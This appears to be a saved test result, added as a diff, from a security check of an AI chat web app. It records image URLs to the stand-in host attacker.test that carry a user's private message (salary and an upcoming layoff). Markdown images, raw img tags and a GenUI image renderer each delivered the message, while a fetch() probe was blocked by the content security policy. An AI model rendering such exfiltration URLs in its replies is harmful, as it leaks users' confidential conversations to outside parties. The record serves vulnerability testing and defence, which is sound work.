@@ -1,0 +1,57 @@
+{
+  "pageUrl": "https://chat.tinfoil.test:44444/chat/abc123",
+  "cspServed": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' data: https://*.tinfoil.sh https://plausible.io https://vitals.vercel-insights.com; frame-src 'self' https://verification-center.tinfoil.sh https://webapp-sandbox.tinfoil.sh https://tinfoil-webapp-sandbox-tinfoil.vercel.app; frame-ancestors https://tinfoil.sh https://www.tinfoil.sh; base-uri 'self'; form-action 'self'; upgrade-insecure-requests",
+  "browserRequestsToAttacker": [
+    {
+      "url": "https://attacker.test:44443/md.png?c=USER%20SAID%3A%20my%20salary%20is%20240k%20and%20I%20am%20being%20laid%20off%20next%20week",
+      "resourceType": "image"
+    },
+    {
+      "url": "https://attacker.test:44443/raw.png?c=USER%20SAID%3A%20my%20salary%20is%20240k%20and%20I%20am%20being%20laid%20off%20next%20week",
+      "resourceType": "image"
+    },
+    {
+      "url": "https://attacker.test:44443/genui.png?c=USER%20SAID%3A%20my%20salary%20is%20240k%20and%20I%20am%20being%20laid%20off%20next%20week",
+      "resourceType": "image"
+    }
+  ],
+  "attackerServerReceived": [
+    {
+      "method": "GET",
+      "path": "/md.png",
+      "leaked": "USER SAID: my salary is 240k and I am being laid off next week",
+      "sec-fetch-dest": "image",
+      "referer": "https://chat.tinfoil.test:44444/",
+      "origin": null
+    },
+    {
+      "method": "GET",
+      "path": "/raw.png",
+      "leaked": "USER SAID: my salary is 240k and I am being laid off next week",
+      "sec-fetch-dest": "image",
+      "referer": "https://chat.tinfoil.test:44444/",
+      "origin": null
+    },
+    {
+      "method": "GET",
+      "path": "/genui.png",
+      "leaked": "USER SAID: my salary is 240k and I am being laid off next week",
+      "sec-fetch-dest": "image",
+      "referer": "https://chat.tinfoil.test:44444/",
+      "origin": null
+    }
+  ],
+  "consoleLines": [
+    "Connecting to 'https://attacker.test:44443/fetch-probe?c=blocked' violates the following Content Security Policy directive: \"connect-src 'self' data: https://*.tinfoil.sh https://plausible.io https://vitals.vercel-insights.com\". The action has been blocked.",
+    "Fetch API cannot load https://attacker.test:44443/fetch-probe?c=blocked. Refused to connect because it violates the document's Content Security Policy.",
+    "FETCH-PROBE rejected: Failed to fetch",
+    "CSP-VIOLATION connect-src https://attacker.test:44443/fetch-probe?c=blocked"
+  ]
+}
+
+=== SUMMARY ===
+attacker received 3 image fetches from the chat page
+leaked via image URL: "USER SAID: my salary is 240k and I am being laid off next week"
+fetch() probe: FETCH-PROBE rejected: Failed to fetch
+CSP violations: CSP-VIOLATION connect-src https://attacker.test:44443/fetch-probe?c=blocked
+VULNERABLE: markdown image, raw <img> and GenUI render_image all delivered the secret to the attacker origin under the production CSP
